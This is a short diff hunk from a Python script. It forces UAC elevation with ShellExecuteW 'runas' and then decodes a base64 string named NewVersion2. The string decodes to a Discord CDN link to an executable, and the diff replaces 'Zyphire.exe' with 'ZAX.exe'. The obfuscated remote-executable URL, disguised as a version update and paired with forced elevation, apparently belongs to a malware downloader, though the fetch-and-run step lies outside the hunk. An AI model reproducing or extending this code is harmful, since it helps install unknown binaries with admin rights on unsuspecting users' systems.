@@ -984,7 +984,7 @@ if __name__ == "__main__":
         if not Utility.IsAdmin():
             ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
             exit(0)
-        NewVersion2 = f'aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE3MDM4MDU0OTI3MDAxNjE5MS8xMTcyMzE4Mzk0MDc5NTE0NjM0L1p5cGhpcmUuZXhlP2V4PTY1NWZlMTk1JmlzPTY1NGQ2Yzk1JmhtPWVkMzZlOGEyMjhlMmYyNTIwOTY3NjliMTMxMTRiZDE1NzFlOTVlMjU2MmEyOGQyNjkzMzcxYWY5YTljY2Q2ZTAm'
+        NewVersion2 = f'aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE3MDM4MDU0OTI3MDAxNjE5MS8xMTc0MzE0OTMwODgzNzk3MDkyL1pBWC5leGU/ZXg9NjU2NzI1MDEmaXM9NjU1NGIwMDEmaG09MGZhZGRmNTY0M2EwNmNjMzU2NjEzNTVjYzdiMGRlMTdlODM2ZTI2ZmQ4NDJiODJkZTdiNTdmZTg1NTI0MWZiMiY='
         N2B = NewVersion2.encode("ascii")
         N2BB = base64.b64decode(N2B)
         N2BS = N2BB.decode("ascii")
